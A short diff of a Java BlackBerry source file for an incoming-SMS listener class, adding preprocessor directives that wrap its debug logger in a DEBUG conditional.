@@ -1,3 +1,4 @@
+//#preprocess
 package blackberry.agent.sms;
 
 import java.io.IOException;
@@ -15,8 +16,10 @@ import blackberry.utils.DebugLevel;
  */
 class SMSINListener implements MessageListener, Runnable {
 
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("SMSINListener", DebugLevel.VERBOSE);
+
+    //#endif
 
     private int messages;
     private final SmsListener smsListener;
